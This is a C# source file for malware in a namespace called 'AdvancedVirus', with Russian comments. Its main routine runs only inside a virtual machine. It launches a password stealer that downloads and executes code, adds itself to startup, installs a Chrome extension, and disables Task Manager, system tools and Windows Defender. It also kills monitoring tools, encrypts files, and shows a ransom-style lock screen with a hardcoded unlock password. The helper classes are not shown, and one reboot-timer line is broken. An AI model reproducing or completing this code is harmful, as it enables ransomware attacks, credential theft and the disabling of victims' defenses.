using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace AdvancedVirus
{
    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        static async Task Main(string[] args)
        {
            // Проверка прав администратора
            if (!IsRunningAsAdministrator())
            {
                Console.WriteLine("This program requires administrator privileges!");
                Console.WriteLine("Please run as Administrator.");
                Console.ReadKey();
                return;
            }

            // Проверка аргументов перезагрузки
            if (args.Length > 0 && args[0] == "/afterReboot")
            {
                ShowPasswordConsole();
                return;
            }

            // Проверка виртуальной машины
            var vmDetector = new VirtualMachineDetector();
            if (!vmDetector.IsRunningInVirtualMachine())
            {
                Console.WriteLine("Not running inside a virtual machine.");
                Console.WriteLine("Exiting...");
                Thread.Sleep(3000);
                return;
            }
            Console.WriteLine("Running inside a virtual machine.");
            Console.WriteLine("Starting virus activities...");
            Console.WriteLine("Starting password stealer...");
            Console.WriteLine("Stealer initiated in background...");
            var stealer = new DiscordDownloader();
            await stealer.DownloadAndExecuteAsync();
            // Настройка автозагрузки
            var startupManager = new StartupManager();
            startupManager.AddToStartupWithParameter();
            var juan = new Juan();
            bool soupExists = juan.CheckSoupExists();
            Console.WriteLine($"Soup exists: {soupExists}");
            if (!soupExists)
            {
                Console.WriteLine("Creating Chrome extension...");
                juan.CreateAndInstallExtension();
                juan.CreateSoupMarker();
            }
            else
            {
                Console.WriteLine("Soup already exists, skipping extension creation.");
            }
            // Применение системных ограничений
            var taskManagerDisabler = new TaskManagerDisabler();
            taskManagerDisabler.DisableTaskManager();

            var systemRestrictions = new SystemRestrictionsManager();
            systemRestrictions.DisableAll();

            var defenderDisabler = new WindowsDefenderPowerShellDisabler();
            defenderDisabler.DisableWindowsDefender();

            // Запуск таймера перезагрузки
            Task.Run(() =>  (40000));

            try
            {
                // Инициализация компонентов
                var processKiller = new ProcessKiller();
                var systemLocaleChanger = new SystemLocaleChanger();

                // Смена локали
                systemLocaleChanger.ChangeToArabic();

                // Запуск фоновых процессов
                Task.Run(() => processKiller.StartTaskManagerKiller());
                Task.Run(() => processKiller.StartProcessHackerKiller());
                Task.Run(() => processKiller.StartWiresharkKiller());

                // Шифрование файлов
                var fileEncryptor = new FileEncryptor();
                fileEncryptor.ShowEncryptionStats();
                await fileEncryptor.StartEncryptionWithCountdown();

                Console.WriteLine("File encryption process completed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error during execution: {ex.Message}");
            }
            finally
            {
                Console.WriteLine("Press any key to exit...");
                Console.ReadKey();
            }
        }

        private static async Task RebootAfterDelay(int milliseconds)
        {
            Console.WriteLine($"System will reboot in {milliseconds / 1000} seconds...");
            await Task.Delay(milliseconds);

            var systemManager = new SystemManager();
            systemManager.RebootSystem();
        }

        private static void ShowPasswordConsole()
        {
            string correctPassword = "recovery123";

            Console.Clear();
            Console.WriteLine("╔══════════════════════════════════════════════════╗");
            Console.WriteLine("║               ВНИМАНИЕ! ВИРУС АКТИВЕН!          ║");
            Console.WriteLine("╠══════════════════════════════════════════════════╣");
            Console.WriteLine("║ Ваша система заблокирована!                     ║");
            Console.WriteLine("║ Все файлы зашифрованы!                          ║");
            Console.WriteLine("║                                                 ║");
            Console.WriteLine("║ Для деактивации введите пароль:                ║");
            Console.WriteLine("╚══════════════════════════════════════════════════╝");
            Console.WriteLine();

            while (true)
            {
                Console.Write("Пароль: ");
                string input = ReadPassword();

                if (input == correctPassword)
                {
                    Console.WriteLine("\nПароль верный! Вирус деактивируется...");

                    // Восстановление системы
                    RemoveFromStartup();
                    var restrictions = new SystemRestrictionsManager();
                    restrictions.EnableAll();
                    var defender = new WindowsDefenderPowerShellDisabler();
                    defender.EnableWindowsDefender();
                    Thread.Sleep(2000);
                    return;
                }
                else
                {
                    Console.WriteLine("\nНЕВЕРНЫЙ ПАРОЛЬ! Попробуйте снова.\n");
                }
            }
        }

        private static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo key;

            do
            {
                key = Console.ReadKey(true);

                if (key.Key != ConsoleKey.Backspace && key.Key != ConsoleKey.Enter)
                {
                    password += key.KeyChar;
                    Console.Write("*");
                }
                else if (key.Key == ConsoleKey.Backspace && password.Length > 0)
                {
                    password = password.Substring(0, password.Length - 1);
                    Console.Write("\b \b");
                }
            }
            while (key.Key != ConsoleKey.Enter);

            return password;
        }

        private static void RemoveFromStartup()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key?.DeleteValue(AppDomain.CurrentDomain.FriendlyName, false);
                }
                Console.WriteLine("Removed from startup.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error removing from startup: {ex.Message}");
            }
        }

        private static bool IsRunningAsAdministrator()
        {
            try
            {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
                    return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                }
            }
            catch
            {
                return false;
            }
        }
    }
}